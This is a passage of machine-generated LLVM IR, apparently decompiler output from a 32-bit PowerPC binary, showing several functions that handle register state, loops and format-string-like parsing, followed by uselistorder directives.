  store i32 %v2_1000d250, i32* @r31, align 4
  br i1 %v4_1000d24c, label %dec_label_pc_1000d258, label %dec_label_pc_1000d2a0

dec_label_pc_1000d258:                            ; preds = %dec_label_pc_1000d24c, %dec_label_pc_1000d210
  %v0_1000d21c = phi i32 [ %v2_1000d250, %dec_label_pc_1000d24c ], [ %v0_1000d258.pre, %dec_label_pc_1000d210 ]
  %v3_1000d258 = icmp eq i32 %v0_1000d21c, 0
  store i32 %v2_1000d104, i32* @r29, align 4
  store i32 %v2_1000d024, i32* @r4, align 4
  store i32 %v2_1000d028, i32* @r6, align 4
  store i32 %v2_1000d104, i32* @r3, align 4
  br i1 %v3_1000d258, label %dec_label_pc_1000d274, label %dec_label_pc_1000d21c

dec_label_pc_1000d274:                            ; preds = %dec_label_pc_1000d258, %dec_label_pc_1000d204.thread, %dec_label_pc_1000d204
  %v0_1000d274 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000d27c = load i32, i32* @r28, align 4
  store i32 268489348, i32* @lr, align 4
  %v4_1000d280 = call i32 @function_1000cb54(i32 %v0_1000d274, i8 32, i32 %v0_1000d27c)
  %v1_1000d284 = load i32, i32* @r28, align 4
  %v4_1000d284 = icmp eq i32 %v4_1000d280, %v1_1000d284
  br i1 %v4_1000d284, label %dec_label_pc_1000d28c, label %dec_label_pc_1000d2a0

dec_label_pc_1000d28c:                            ; preds = %dec_label_pc_1000d274, %dec_label_pc_1000cfdc, %dec_label_pc_1000cdb4
  %stack_var_-184.2 = phi i32 [ %v0_1000cee4, %dec_label_pc_1000cdb4 ], [ %stack_var_-184.1, %dec_label_pc_1000d274 ], [ %v0_1000cee4, %dec_label_pc_1000cfdc ]
  %v3_1000d28c = load i8*, i8** %stack_var_-200, align 4
  %v4_1000d28c = ptrtoint i8* %v3_1000d28c to i32
  store i32 %v4_1000d28c, i32* @r29, align 4
  br label %dec_label_pc_1000d290

dec_label_pc_1000d290:                            ; preds = %dec_label_pc_1000ccac, %dec_label_pc_1000d28c
  %v0_1000d290 = phi i32 [ %v0_1000d290.pre, %dec_label_pc_1000ccac ], [ %v4_1000d28c, %dec_label_pc_1000d28c ]
  %v0_1000cee4 = phi i32 [ %tmp56, %dec_label_pc_1000ccac ], [ %stack_var_-184.2, %dec_label_pc_1000d28c ]
  br label %dec_label_pc_1000ccc4

dec_label_pc_1000d2a0:                            ; preds = %dec_label_pc_1000d0f8, %dec_label_pc_1000d274, %dec_label_pc_1000d204, %dec_label_pc_1000d1b0, %dec_label_pc_1000d194, %dec_label_pc_1000d054, %dec_label_pc_1000d024, %dec_label_pc_1000cfb8, %dec_label_pc_1000cd00, %dec_label_pc_1000d24c
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000d2a4

dec_label_pc_1000d2a4:                            ; preds = %dec_label_pc_1000cd0c, %dec_label_pc_1000cc84, %dec_label_pc_1000cc9c, %dec_label_pc_1000d2a0
  store i32 %v0_1000cc58, i32* %r0.global-to-local, align 4
  %v0_1000d2a8 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000d2a8

; uselistorder directives
  uselistorder i32 %v0_1000cee4, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000d21c, { 2, 1, 0 }
  uselistorder i32 %v1_1000d180, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000d110, { 1, 0 }
  uselistorder i32 %v2_1000d0a0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000d000, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000cee4, { 1, 0 }
  uselistorder i32 %v6_1000ce9c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000ce6c, { 1, 0 }
  uselistorder i32 %v1_1000ce10, { 1, 0 }
  uselistorder i32 %v0_1000cdb8, { 1, 0, 2 }
  uselistorder i32 %v1_1000cda4, { 1, 0 }
  uselistorder i32 %v0_1000cd9c, { 1, 0 }
  uselistorder i32 %v1_1000cd98, { 1, 0 }
  uselistorder i32 %v1_1000cd18, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000cce0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ccf0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000d104, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v4_1000cd50, { 1, 0 }
  uselistorder i32 %v2_1000cd4c, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp60, { 1, 0 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1, 8 }
  uselistorder i32* %r10.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 (i32, i8, i32)* @function_1000cb54, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_100106a4, { 1, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d2a4, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d2a0, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000d290, { 1, 0 }
  uselistorder label %dec_label_pc_1000d274, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d24c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d188, { 1, 0 }
  uselistorder label %dec_label_pc_1000d170, { 1, 0 }
  uselistorder label %dec_label_pc_1000d15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d13c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d13cthread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d130, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d0ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000d024, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf74, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf5c, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000cf0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cef0, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000ce7c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce60, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ce1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cda8, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000cd94.dec_label_pc_1000cd94_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd6c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd00, { 1, 0 }
  uselistorder label %dec_label_pc_1000ccc4, { 1, 0 }
}

define i32 @function_1000d2bc(i32* %arg1) local_unnamed_addr {
dec_label_pc_1000d2bc:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000d2c0 = load i32, i32* @lr, align 4
  store i32 %v0_1000d2c0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000d2d0 = load i32, i32* @r4, align 4
  store i32 %v0_1000d2d0, i32* @r30, align 4
  store i32 268489440, i32* @lr, align 4
  %v3_1000d2dc = call i32 @function_1000dd4c(i32 0, i32 160, i32 160)
  %v0_1000d2e0 = load i32, i32* @r31, align 4
  %v1_1000d2e0 = add i32 %v0_1000d2e0, 24
  %v2_1000d2e0 = inttoptr i32 %v1_1000d2e0 to i32*
  %v3_1000d2e0 = load i32, i32* %v2_1000d2e0, align 4
  store i32 %v3_1000d2e0, i32* %r9.global-to-local, align 4
  %v1_1000d2e4 = add i32 %v0_1000d2e0, 40
  store i32 %v1_1000d2e4, i32* %r11.global-to-local, align 4
  %v0_1000d2e8 = load i32, i32* @r30, align 4
  %v2_1000d2e8 = inttoptr i32 %v0_1000d2e0 to i32*
  store i32 %v0_1000d2e8, i32* %v2_1000d2e8, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v0_1000d2f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d2f0 = add i32 %v0_1000d2f0, -1
  %v1_1000d2f4 = load i32, i32* @r31, align 4
  %v2_1000d2f4 = add i32 %v1_1000d2f4, 24
  %v3_1000d2f4 = inttoptr i32 %v2_1000d2f4 to i32*
  store i32 %v1_1000d2f0, i32* %v3_1000d2f4, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v1_1000d300.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d300

dec_label_pc_1000d300:                            ; preds = %dec_label_pc_1000d300, %dec_label_pc_1000d2bc
  %v1_1000d300 = phi i32 [ %v1_1000d304, %dec_label_pc_1000d300 ], [ %v1_1000d300.pre, %dec_label_pc_1000d2bc ]
  %v0_1000d300 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d300 = inttoptr i32 %v1_1000d300 to i32*
  store i32 %v0_1000d300, i32* %v2_1000d300, align 4
  %v0_1000d304 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d304 = add i32 %v0_1000d304, 4
  store i32 %v1_1000d304, i32* %r11.global-to-local, align 4
  %v0_1000d308 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d308 = add i32 %v0_1000d308, -1
  store i32 %v1_1000d308, i32* %ctr.global-to-local, align 4
  %v2_1000d308 = icmp eq i32 %v1_1000d308, 0
  br i1 %v2_1000d308, label %dec_label_pc_1000d30c, label %dec_label_pc_1000d300

dec_label_pc_1000d30c:                            ; preds = %dec_label_pc_1000d300
  %v0_1000d30c = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d34c

dec_label_pc_1000d31c:                            ; preds = %dec_label_pc_1000d34c
  %v3_1000d354 = icmp eq i8 %v2_1000d34c, 37
  br i1 %v3_1000d354, label %dec_label_pc_1000d320, label %dec_label_pc_1000d348

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d31c
  %v1_1000d320 = add i32 %v0_1000d320, 1
  %v2_1000d320 = inttoptr i32 %v1_1000d320 to i8*
  %v3_1000d320 = load i8, i8* %v2_1000d320, align 1
  %v4_1000d320 = zext i8 %v3_1000d320 to i32
  store i32 %v4_1000d320, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d320, i32* %r9.global-to-local, align 4
  %v3_1000d328 = icmp eq i8 %v3_1000d320, 37
  br i1 %v3_1000d328, label %dec_label_pc_1000d348, label %dec_label_pc_1000d330

dec_label_pc_1000d330:                            ; preds = %dec_label_pc_1000d320
  %v0_1000d324 = load i32, i32* @r31, align 4
  %v2_1000d330 = inttoptr i32 %v0_1000d324 to i32*
  store i32 %v1_1000d320, i32* %v2_1000d330, align 4
  store i32 268489528, i32* @lr, align 4
  %v1_1000d334 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d334 = call i32 @function_1000d684(i32* %v2_1000d330, i32 %v1_1000d334)
  %v1_1000d338 = icmp slt i32 %v3_1000d334, 0
  br i1 %v1_1000d338, label %dec_label_pc_1000d364, label %dec_label_pc_1000d340

dec_label_pc_1000d340:                            ; preds = %dec_label_pc_1000d330
  %v0_1000d340 = load i32, i32* @r31, align 4
  %v1_1000d340 = inttoptr i32 %v0_1000d340 to i32*
  %v2_1000d340 = load i32, i32* %v1_1000d340, align 4
  br label %dec_label_pc_1000d34c

dec_label_pc_1000d348:                            ; preds = %dec_label_pc_1000d31c, %dec_label_pc_1000d320
  %v0_1000d348 = phi i32 [ %v0_1000d320, %dec_label_pc_1000d31c ], [ %v1_1000d320, %dec_label_pc_1000d320 ]
  %v1_1000d348 = add i32 %v0_1000d348, 1
  br label %dec_label_pc_1000d34c

dec_label_pc_1000d34c:                            ; preds = %dec_label_pc_1000d340, %dec_label_pc_1000d348, %dec_label_pc_1000d30c
  %v0_1000d320 = phi i32 [ %v0_1000d30c, %dec_label_pc_1000d30c ], [ %v1_1000d348, %dec_label_pc_1000d348 ], [ %v2_1000d340, %dec_label_pc_1000d340 ]
  store i32 %v0_1000d320, i32* %r9.global-to-local, align 4
  %v1_1000d34c = inttoptr i32 %v0_1000d320 to i8*
  %v2_1000d34c = load i8, i8* %v1_1000d34c, align 1
  %v3_1000d34c = zext i8 %v2_1000d34c to i32
  store i32 %v3_1000d34c, i32* %r0.global-to-local, align 4
  %v3_1000d350 = icmp eq i8 %v2_1000d34c, 0
  br i1 %v3_1000d350, label %dec_label_pc_1000d35c, label %dec_label_pc_1000d31c

dec_label_pc_1000d35c:                            ; preds = %dec_label_pc_1000d34c
  %v0_1000d35c = load i32, i32* @r30, align 4
  %v1_1000d35c = load i32, i32* @r31, align 4
  %v2_1000d35c = inttoptr i32 %v1_1000d35c to i32*
  store i32 %v0_1000d35c, i32* %v2_1000d35c, align 4
  br label %dec_label_pc_1000d364

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d330, %dec_label_pc_1000d35c
  %storemerge = phi i32 [ 0, %dec_label_pc_1000d35c ], [ -1, %dec_label_pc_1000d330 ]
  store i32 %v0_1000d2c0, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_1000d34c, { 1, 2, 0 }
  uselistorder i32 %v0_1000d320, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000d308, { 1, 0 }
  uselistorder i32 %v1_1000d304, { 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000d364, { 1, 0 }
  uselistorder label %dec_label_pc_1000d34c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d348, { 1, 0 }
}

define i32 @function_1000d378(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000d378:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d37c = load i32, i32* @lr, align 4
  %v0_1000d380 = load i32, i32* @r3, align 4
  store i32 %v0_1000d380, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000d39c = add i32 %v0_1000d380, 24
  %v2_1000d39c = inttoptr i32 %v1_1000d39c to i32*
  %v3_1000d39c = load i32, i32* %v2_1000d39c, align 4
  store i32 %v3_1000d39c, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_1000d39c, 1
  br i1 %tmp4, label %dec_label_pc_1000d3c0, label %dec_label_pc_1000d3a8

dec_label_pc_1000d3a8:                            ; preds = %dec_label_pc_1000d378
  %v2_1000d3a8 = add i32 %v0_1000d380, 8
  %v3_1000d3a8 = inttoptr i32 %v2_1000d3a8 to i32*
  store i32 0, i32* %v3_1000d3a8, align 4
  %v0_1000d3ac = load i32, i32* @r30, align 4
  %v1_1000d3ac = load i32, i32* @r3, align 4
  %v2_1000d3ac = add i32 %v1_1000d3ac, 28
  %v3_1000d3ac = inttoptr i32 %v2_1000d3ac to i32*
  store i32 %v0_1000d3ac, i32* %v3_1000d3ac, align 4
  %v0_1000d3b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d3b0 = load i32, i32* @r3, align 4
  %v2_1000d3b0 = add i32 %v1_1000d3b0, 24
  %v3_1000d3b0 = inttoptr i32 %v2_1000d3b0 to i32*
  store i32 %v0_1000d3b0, i32* %v3_1000d3b0, align 4
  %v0_1000d3b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d3b4 = load i32, i32* @r3, align 4
  %v2_1000d3b4 = add i32 %v1_1000d3b4, 4
  %v3_1000d3b4 = inttoptr i32 %v2_1000d3b4 to i32*
  store i32 %v0_1000d3b4, i32* %v3_1000d3b4, align 4
  store i32 268489660, i32* @lr, align 4
  %v0_1000d3b8 = call i32 @function_1000d3d4()
  store i32 %v0_1000d3b8, i32* %r3.global-to-local, align 4
  %v0_1000d3bc = load i32, i32* @r30, align 4
  %v1_1000d3bc = load i32, i32* @r31, align 4
  %v2_1000d3bc = add i32 %v1_1000d3bc, 24
  %v3_1000d3bc = inttoptr i32 %v2_1000d3bc to i32*
  store i32 %v0_1000d3bc, i32* %v3_1000d3bc, align 4
  %v0_1000d3d0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d3c0

dec_label_pc_1000d3c0:                            ; preds = %dec_label_pc_1000d378, %dec_label_pc_1000d3a8
  %v0_1000d3d0 = phi i32 [ %v0_1000d380, %dec_label_pc_1000d378 ], [ %v0_1000d3d0.pre, %dec_label_pc_1000d3a8 ]
  store i32 %v0_1000d37c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d3d0

; uselistorder directives
  uselistorder i32 ()* @function_1000d3d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3c0, { 1, 0 }
}

define i32 @function_1000d3d4() local_unnamed_addr {
dec_label_pc_1000d3d4:
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000d3d4 = load i32, i32* @r3, align 4
  %v1_1000d3d4 = add i32 %v0_1000d3d4, 24
  %v2_1000d3d4 = inttoptr i32 %v1_1000d3d4 to i32*
  %v3_1000d3d4 = load i32, i32* %v2_1000d3d4, align 4
  store i32 %v3_1000d3d4, i32* %r0.global-to-local, align 4
  %v1_1000d3d8 = add i32 %v0_1000d3d4, 88
  store i32 %v1_1000d3d8, i32* @r8, align 4
  %v1_1000d3dc = add i32 %v0_1000d3d4, 8
  %v2_1000d3dc = inttoptr i32 %v1_1000d3dc to i32*
  %v3_1000d3dc = load i32, i32* %v2_1000d3dc, align 4
  store i32 %v3_1000d3dc, i32* %r9.global-to-local, align 4
  %v2_1000d3e0 = icmp sgt i32 %v3_1000d3d4, 0
  %v3_1000d3e0 = icmp eq i32 %v3_1000d3d4, 0
  store i1 %v2_1000d3e0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000d3e0, label %dec_label_pc_1000d3e8, label %dec_label_pc_1000d5d4

dec_label_pc_1000d3e8:                            ; preds = %dec_label_pc_1000d3d4
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  %v3_1000d3ec = icmp ne i32 %v3_1000d3dc, -2147483648
  %v4_1000d3ec = icmp eq i32 %v3_1000d3dc, -2147483648
  store i1 %v3_1000d3ec, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d3ec, label %dec_label_pc_1000d3f4, label %dec_label_pc_1000d434

dec_label_pc_1000d3f4:                            ; preds = %dec_label_pc_1000d3e8
  %v1_1000d3f4 = add i32 %v0_1000d3d4, 76
  %v2_1000d3f4 = inttoptr i32 %v1_1000d3f4 to i8*
  %v3_1000d3f4 = load i8, i8* %v2_1000d3f4, align 1
  %v4_1000d3f4 = zext i8 %v3_1000d3f4 to i32
  store i32 %v4_1000d3f4, i32* %r11.global-to-local, align 4
  store i32 %v1_1000d3f4, i32* %r10.global-to-local, align 4
  %v2_1000d3fc = icmp ugt i8 %v3_1000d3f4, 8
  store i1 %v2_1000d3fc, i1* %cr7_gt.global-to-local, align 1
  %tmp = icmp ugt i8 %v3_1000d3f4, 7
  br i1 %tmp, label %dec_label_pc_1000d41c, label %dec_label_pc_1000d404

dec_label_pc_1000d404:                            ; preds = %dec_label_pc_1000d3f4
  %v1_1000d404 = add i32 %v0_1000d3d4, 84
  %v2_1000d404 = inttoptr i32 %v1_1000d404 to i32*
  %v3_1000d404 = load i32, i32* %v2_1000d404, align 4
  store i32 %v3_1000d404, i32* %r0.global-to-local, align 4
  %v1_1000d408 = mul nuw nsw i32 %v4_1000d3f4, 4
  store i32 %v1_1000d408, i32* %r9.global-to-local, align 4
  %v1_1000d40c = add nuw nsw i32 %v4_1000d3f4, 1
  store i32 %v1_1000d40c, i32* %r11.global-to-local, align 4
  %v1_1000d410 = trunc i32 %v1_1000d40c to i8
  store i8 %v1_1000d410, i8* %v2_1000d3f4, align 1
  %v0_1000d414 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d414 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d414 = add i32 %v1_1000d414, %v0_1000d414
  store i32 %v2_1000d414, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d428

dec_label_pc_1000d41c:                            ; preds = %dec_label_pc_1000d3f4
  %v1_1000d41c = add i32 %v0_1000d3d4, 80
  %v2_1000d41c = inttoptr i32 %v1_1000d41c to i32*
  %v3_1000d41c = load i32, i32* %v2_1000d41c, align 4
  store i32 %v3_1000d41c, i32* %r9.global-to-local, align 4
  %v1_1000d420 = add i32 %v3_1000d41c, 4
  store i32 %v1_1000d420, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d420, i32* %v2_1000d41c, align 4
  %v0_1000d428.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d428

dec_label_pc_1000d428:                            ; preds = %dec_label_pc_1000d404, %dec_label_pc_1000d41c
  %v0_1000d428 = phi i32 [ %v2_1000d414, %dec_label_pc_1000d404 ], [ %v0_1000d428.pre, %dec_label_pc_1000d41c ]
  %v1_1000d428 = inttoptr i32 %v0_1000d428 to i32*
  %v2_1000d428 = load i32, i32* %v1_1000d428, align 4
  store i32 %v2_1000d428, i32* %r0.global-to-local, align 4
  %v1_1000d42c = load i32, i32* @r8, align 4
  %v2_1000d42c = inttoptr i32 %v1_1000d42c to i32*
  store i32 %v2_1000d428, i32* %v2_1000d42c, align 4
  %v0_1000d430 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d430 = load i32, i32* @r3, align 4
  %v2_1000d430 = add i32 %v1_1000d430, 8
  %v3_1000d430 = inttoptr i32 %v2_1000d430 to i32*
  store i32 %v0_1000d430, i32* %v3_1000d430, align 4
  %v0_1000d434.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d434

dec_label_pc_1000d434:                            ; preds = %dec_label_pc_1000d3e8, %dec_label_pc_1000d428
  %v2_1000d460 = phi i32 [ %v0_1000d3d4, %dec_label_pc_1000d3e8 ], [ %v0_1000d434.pre, %dec_label_pc_1000d428 ]
  %v1_1000d434 = add i32 %v2_1000d460, 4
  %v2_1000d434 = inttoptr i32 %v1_1000d434 to i32*
  %v3_1000d434 = load i32, i32* %v2_1000d434, align 4
  store i32 %v3_1000d434, i32* %r0.global-to-local, align 4
  store i32 -2147483648, i32* %r9.global-to-local, align 4
  %v3_1000d43c = icmp ne i32 %v3_1000d434, -2147483648
  %v4_1000d43c = icmp eq i32 %v3_1000d434, -2147483648
  store i1 %v3_1000d43c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000d43c, label %dec_label_pc_1000d444, label %dec_label_pc_1000d5c4.preheader

dec_label_pc_1000d444:                            ; preds = %dec_label_pc_1000d434
  %v1_1000d444 = add i32 %v2_1000d460, 76
  %v2_1000d444 = inttoptr i32 %v1_1000d444 to i8*
  %v3_1000d444 = load i8, i8* %v2_1000d444, align 1
  %v4_1000d444 = zext i8 %v3_1000d444 to i32
  store i32 %v4_1000d444, i32* %r11.global-to-local, align 4
  store i32 %v1_1000d444, i32* %r10.global-to-local, align 4
  %v2_1000d44c = icmp ugt i8 %v3_1000d444, 8
  store i1 %v2_1000d44c, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1000d444, 7
  br i1 %tmp26, label %dec_label_pc_1000d46c, label %dec_label_pc_1000d454

dec_label_pc_1000d454:                            ; preds = %dec_label_pc_1000d444
  %v1_1000d454 = add i32 %v2_1000d460, 84
  %v2_1000d454 = inttoptr i32 %v1_1000d454 to i32*
  %v3_1000d454 = load i32, i32* %v2_1000d454, align 4
  store i32 %v3_1000d454, i32* %r0.global-to-local, align 4
  %v1_1000d458 = mul nuw nsw i32 %v4_1000d444, 4
  store i32 %v1_1000d458, i32* %r9.global-to-local, align 4
  %v1_1000d45c = add nuw nsw i32 %v4_1000d444, 1
  store i32 %v1_1000d45c, i32* %r11.global-to-local, align 4
  %v1_1000d460 = trunc i32 %v1_1000d45c to i8
  store i8 %v1_1000d460, i8* %v2_1000d444, align 1
  %v0_1000d464 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d464 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000d464 = add i32 %v1_1000d464, %v0_1000d464
  store i32 %v2_1000d464, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d478

dec_label_pc_1000d46c:                            ; preds = %dec_label_pc_1000d444
  %v1_1000d46c = add i32 %v2_1000d460, 80
  %v2_1000d46c = inttoptr i32 %v1_1000d46c to i32*
  %v3_1000d46c = load i32, i32* %v2_1000d46c, align 4
  store i32 %v3_1000d46c, i32* %r9.global-to-local, align 4
  %v1_1000d470 = add i32 %v3_1000d46c, 4
  store i32 %v1_1000d470, i32* %r0.global-to-local, align 4
  store i32 %v1_1000d470, i32* %v2_1000d46c, align 4
  %v0_1000d478.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d478

dec_label_pc_1000d478:                            ; preds = %dec_label_pc_1000d454, %dec_label_pc_1000d46c
  %v0_1000d478 = phi i32 [ %v2_1000d464, %dec_label_pc_1000d454 ], [ %v0_1000d478.pre, %dec_label_pc_1000d46c ]
  %v1_1000d478 = inttoptr i32 %v0_1000d478 to i32*
  %v2_1000d478 = load i32, i32* %v1_1000d478, align 4
  store i32 %v2_1000d478, i32* %r0.global-to-local, align 4
  %v1_1000d47c = load i32, i32* @r8, align 4
  %v2_1000d47c = inttoptr i32 %v1_1000d47c to i32*
  store i32 %v2_1000d478, i32* %v2_1000d47c, align 4
  %v0_1000d480 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d480 = load i32, i32* @r3, align 4
  %v2_1000d480 = add i32 %v1_1000d480, 4
  %v3_1000d480 = inttoptr i32 %v2_1000d480 to i32*
  store i32 %v0_1000d480, i32* %v3_1000d480, align 4
  %v0_1000d5c45.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d5c4.preheader

dec_label_pc_1000d5c4.preheader:                  ; preds = %dec_label_pc_1000d434, %dec_label_pc_1000d478
  %v0_1000d5c45 = phi i32 [ %v2_1000d460, %dec_label_pc_1000d434 ], [ %v0_1000d5c45.pre, %dec_label_pc_1000d478 ]
  store i32 0, i32* @r7, align 4
  %v1_1000d5c46 = add i32 %v0_1000d5c45, 28
  %v2_1000d5c47 = inttoptr i32 %v1_1000d5c46 to i32*
  %v3_1000d5c48 = load i32, i32* %v2_1000d5c47, align 4
  store i32 %v3_1000d5c48, i32* %r0.global-to-local, align 4
  %v2_1000d5c89 = icmp sgt i32 %v3_1000d5c48, 0
  %v3_1000d5c810 = icmp slt i32 %v3_1000d5c48, 0
  store i1 %v3_1000d5c810, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000d5c89, label %dec_label_pc_1000d48c, label %dec_label_pc_1000d614

dec_label_pc_1000d48c:                            ; preds = %dec_label_pc_1000d5c4.preheader, %dec_label_pc_1000d5c0
  %v2_1000d59c = phi i32 [ %v0_1000d5c4, %dec_label_pc_1000d5c0 ], [ %v0_1000d5c45, %dec_label_pc_1000d5c4.preheader ]
  %v0_1000d48c = phi i32 [ %v1_1000d5c0, %dec_label_pc_1000d5c0 ], [ 0, %dec_label_pc_1000d5c4.preheader ]
  %v1_1000d48c = mul i32 %v0_1000d48c, 4
  %v2_1000d490 = add i32 %v1_1000d48c, %v2_1000d59c
  store i32 %v2_1000d490, i32* %r9.global-to-local, align 4
  %v1_1000d494 = add i32 %v2_1000d490, 40
  %v2_1000d494 = inttoptr i32 %v1_1000d494 to i32*
  %v3_1000d494 = load i32, i32* %v2_1000d494, align 4
  store i32 %v3_1000d494, i32* %r0.global-to-local, align 4
  %v2_1000d498 = icmp sgt i32 %v3_1000d494, 8
